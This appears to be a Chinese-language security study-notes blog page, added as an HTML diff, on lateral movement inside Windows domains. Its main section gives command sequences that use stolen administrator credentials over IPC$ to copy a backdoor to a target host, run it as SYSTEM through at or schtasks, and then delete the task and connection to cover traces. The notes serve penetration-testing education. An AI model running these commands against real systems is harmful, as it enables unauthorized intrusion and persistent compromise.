@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这是第五章的学习记录汇总…  域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。 攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。  目录：   主要内容 知识点    常用Windows远程连接和相关命令 内网中利用Windows自带工具IPC管道进行连接及常用命令   W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全学习笔记--Ⅴ：域内横向移动">
+<meta property="og:url" content="http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="这是第五章的学习记录汇总…  域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。 攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。  目录：   主要内容 知识点    常用Windows远程连接和相关命令 内网中利用Windows自带工具IPC管道进行连接及常用命令   W">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210202194230744.png">
+<meta property="article:published_time" content="2021-02-02T07:23:37.000Z">
+<meta property="article:modified_time" content="2021-02-02T07:23:37.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210202194230744.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网安全学习笔记--Ⅴ：域内横向移动</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/03/Apache-Druid-CVE-2021-25646%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/01/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记--Ⅴ：域内横向移动&body=Check out this article: http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网安全学习笔记--Ⅴ：域内横向移动&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#目录："><span class="toc-number">1.</span> <span class="toc-text">目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一、常用Windows远程连接和相关命令"><span class="toc-number">2.</span> <span class="toc-text">一、常用Windows远程连接和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法："><span class="toc-number">2.1.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件："><span class="toc-number">2.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法："><span class="toc-number">2.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Windows系统散列值获取"><span class="toc-number">3.</span> <span class="toc-text">二、Windows系统散列值获取</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网安全学习笔记--Ⅴ：域内横向移动
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-02T07:23:37.000Z" itemprop="datePublished">2021-02-02</time>
+        
+        (Updated: <time datetime="2021-02-02T07:23:37.000Z" itemprop="dateModified">2021-02-02</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>, <a class="tag-link" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag">横向移动</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这是第五章的学习记录汇总…</p>
+<blockquote>
+<p>域内横向移动再内网攻击中被广泛使用，尤其是在APT 高级持续威胁。</p>
+<p>攻击者利用横向移动，以被攻陷主机为跳板，访问其它域内主机 以扩大资产范围，包括包括跳板机器中的文档和存储的凭证、跳板机的数据库连接信息、域控及其它重要资产。</p>
+</blockquote>
+<h3 id="目录："><a href="#目录：" class="headerlink" title="目录："></a>目录：</h3><table>
+<thead>
+<tr>
+<th>主要内容</th>
+<th>知识点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>常用Windows远程连接和相关命令</td>
+<td>内网中利用Windows自带工具IPC管道进行连接及常用命令</td>
+</tr>
+<tr>
+<td>Windows系统散列值获取</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="一、常用Windows远程连接和相关命令"><a href="#一、常用Windows远程连接和相关命令" class="headerlink" title="一、常用Windows远程连接和相关命令"></a>一、常用Windows远程连接和相关命令</h3><p>场景：已经获取到目标主机用户明文密码，网络环境较为苛刻，可以用Windows自带工具IPC建立远程连接。</p>
+<p>IPC（Internal Process Connection，空连接）共享“命名管道”资源，能够查看远程主机的共享资源。通过ipc可以与目标主机建立连接，从而访问、上传或下载目标主机的文件及运行其它命令。</p>
+<h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 建立一个连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看当前连接</span><br><span class="line"><span class="built_in">net</span> use</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210202194230744.png" alt="image-20210202194230744"></p>
+<p>IPC连接常见错误提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误号5：拒绝访问（本地权限问题）</span><br><span class="line">错误号51：无法找到网络路径（网络问题）</span><br><span class="line">错误号53：找不到网络路径（IP地址错误、目标未开机、目标有防火墙等）</span><br><span class="line">错误号67：找不到网络名（服务未启动、IPC$已被删除）</span><br><span class="line">错误号1219：提供的凭据与已存在的凭据冲突</span><br><span class="line">错误号1326：用户名或密码错误</span><br><span class="line">错误号1792：目标网络服务未启动，包括Netlogon服务未启动（连接域控可能会出现）</span><br><span class="line">错误号2242：密码已过期</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><p>开放了139、445端口；目标开启ipc$文件共享；已获取用户账号密码。</p>
+<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>可以使用以下命令</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 列出目标c盘目录</span><br><span class="line"><span class="built_in">dir</span>  \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$</span><br><span class="line"># 上传文件到目标主机</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\c$\windows\temp\plugin_update.exe</span><br><span class="line"># 查看目标主机进程</span><br><span class="line">TASKLIST /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /U username /P password</span><br><span class="line"># 查看目标主机时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>之前的系统</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> <span class="number">1</span>:<span class="number">00</span>PM C:\plugin_update.exe</span><br><span class="line"># 清楚任务记录</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> job_id /delete</span><br><span class="line"># 创建计划任务，适用于<span class="number">2008</span>以后的系统</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System /u administrator /p "passwd"</span><br><span class="line"># 立即启动计划任务</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br><span class="line"># 删除计划任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /u administrator /p "passwd"</span><br></pre></td></tr></table></figure>
+
+<p>利用IPC上传后门并执行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 首先建立连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span>\ipc$ /user:administrator "passwd"</span><br><span class="line"># 查看目标机器时间</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 创建计划任务，任务名 plugin_update</span><br><span class="line">schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">13</span>:<span class="number">00</span> /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /RU System</span><br><span class="line"># 也可以立即运行后门程序</span><br><span class="line">schtasks /run /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除创建的任务</span><br><span class="line">schtasks /F /delete /tn "plugin_update" /S <span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span></span><br><span class="line"># 删除IPC</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">193</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">80</span> /<span class="built_in">del</span> /y</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、Windows系统散列值获取"><a href="#二、Windows系统散列值获取" class="headerlink" title="二、Windows系统散列值获取"></a>二、Windows系统散列值获取</h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#目录："><span class="toc-number">1.</span> <span class="toc-text">目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一、常用Windows远程连接和相关命令"><span class="toc-number">2.</span> <span class="toc-text">一、常用Windows远程连接和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法："><span class="toc-number">2.1.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件："><span class="toc-number">2.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法："><span class="toc-number">2.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Windows系统散列值获取"><span class="toc-number">3.</span> <span class="toc-text">二、Windows系统散列值获取</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记--Ⅴ：域内横向移动&body=Check out this article: http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网安全学习笔记--Ⅴ：域内横向移动&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/02/tmp/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
